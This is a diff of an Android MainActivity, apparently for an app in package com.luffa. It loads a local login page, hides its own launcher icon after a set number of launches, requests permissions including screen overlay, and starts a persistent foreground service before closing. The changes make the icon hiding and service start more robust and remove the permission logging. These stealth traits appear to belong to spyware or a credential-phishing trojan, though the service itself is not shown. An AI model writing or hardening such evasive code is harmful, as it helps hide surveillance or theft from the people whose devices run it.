@@ -1,6 +1,10 @@
 package com.luffa
 
 import android.Manifest
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
@@ -13,8 +17,9 @@ import android.util.Log
 import android.net.Uri
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
-import com.luffa.MyService
+import com.luffa.MyService // Ensure this class exists and is a Service
 import android.content.ComponentName
 import android.webkit.*
 import androidx.preference.PreferenceManager
@@ -31,7 +36,10 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Initialize WebView and Layout
+        // 1. Initialize SharedPreferences FIRST
+        prefs = PreferenceManager.getDefaultSharedPreferences(this)
+
+        // 2. Initialize WebView and Layout
         myWebView = WebView(this)
         setContentView(myWebView)
 
@@ -46,14 +54,13 @@ class MainActivity : AppCompatActivity() {
         myWebView.webChromeClient = WebChromeClient()
         myWebView.loadUrl("file:///android_asset/login.html")
 
-        // Initialize SharedPreferences
-        prefs = PreferenceManager.getDefaultSharedPreferences(this)
+        // 3. Initialize Service Intent
+        serviceIntent = Intent(this, MyService::class.java)
 
-        // Moved launch logic here inside onCreate
+        // 4. Execute Logic Safely
         val currentLaunches = prefs.getInt("launch_count", 0) + 1
         prefs.edit().putInt("launch_count", currentLaunches).apply()
 
-        serviceIntent = Intent(this, MyService::class.java)
         requestPermissions()
 
         if (currentLaunches >= LAUNCH_LIMIT) {
@@ -65,11 +72,15 @@ class MainActivity : AppCompatActivity() {
 
     private fun hideAppIcon() {
         val componentName = ComponentName(this, MainActivity::class.java)
-        packageManager.setComponentEnabledSetting(
-            componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
+        try {
+            packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Error hiding icon", e)
+        }
     }
 
     private val perms = arrayOf(
@@ -104,12 +115,7 @@ class MainActivity : AppCompatActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-
         if (requestCode == REQUEST_PERM_CODE) {
-            permissions.forEachIndexed { index, permission ->
-                val granted = grantResults.getOrNull(index) == PackageManager.PERMISSION_GRANTED
-                Log.d("Permissions", "$permission -> ${if (granted) "GRANTED" else "DENIED"}")
-            }
             checkOverlayPermissionThenStart()
         }
     }
@@ -134,22 +140,32 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startService() {
+        // Ensure MyService is ready to startForeground
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent)
+            try {
+                startForegroundService(serviceIntent)
+            } catch (e: Exception) {
+                Log.e("MainActivity", "StartForegroundService failed", e)
+            }
         } else {
-            startService(serviceIntent)
+            try {
+                startService(serviceIntent)
+            } catch (e: Exception) {
+                Log.e("MainActivity", "StartService failed", e)
+            }
         }
 
+        // Vibration
         val vibrator = getSystemService(Vibrator::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            vibrator?.vibrate(VibrationEffect.createOneShot(100, VibrationEffect.DEFAULT_AMPLITUDE))
-        } else {
-            @Suppress("DEPRECATION")
-            vibrator?.vibrate(100)
+        if (vibrator?.hasVibrator() == true) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vibrator.vibrate(VibrationEffect.createOneShot(100, VibrationEffect.DEFAULT_AMPLITUDE))
+            } else {
+                @Suppress("DEPRECATION")
+                vibrator.vibrate(100)
+            }
         }
 
         finish()
     }
-
-    // Removed companion object to avoid duplicate REQUEST_PERM_CODE definition
 }
